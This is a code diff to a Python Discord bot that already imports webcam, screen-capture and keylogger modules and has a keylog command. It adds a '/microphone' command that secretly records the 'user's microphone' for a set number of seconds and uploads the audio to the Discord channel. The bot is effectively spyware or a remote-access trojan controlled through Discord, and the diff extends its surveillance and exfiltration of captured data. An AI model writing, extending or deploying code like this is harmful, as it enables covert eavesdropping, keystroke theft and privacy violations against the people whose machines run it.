@@ -7,6 +7,7 @@ from discord.ext import commands
 import webcam
 import screencapture
 import keylogger
+import MicrophoneTap
 
 load_dotenv()
 
@@ -101,6 +102,22 @@ async def keylog(interaction: discord.Interaction, duration: int=60):
             await interaction.followup.send(file=discord.File("{0}\\logs\\{1}".format(curDir,logfile)))
         except Exception:
             await interaction.followup.send(file=discord.File(".\\Python\\logs\\{}".format(logfile)))
+
+@client.tree.command(name="microphone", description="Start listening to the user's microphone for n seconds. Defaults to 60 seconds", guild=GUILD_ID)
+async def mictap(interaction: discord.Interaction, duration: int=60):
+    print(interaction, duration)
+    await interaction.response.send_message(content="Okiedokie! Listening for {} seconds".format(duration))
+    # Get the original response message
+    GetMsg = await interaction.original_response()
+    print(GetMsg)
     
+    curDir = os.getcwd()
+    micTap = MicrophoneTap.MicrophoneTap(duration)
+    audioFile = micTap.activate()
+
+    if audioFile:
+        # Send the audio file as an attachment
+        await interaction.followup.send(file=discord.File("{0}\\{1}".format(curDir, audioFile)))
+
 token = os.getenv('DISCORD_BOT_TOKEN')
 client.run(token)
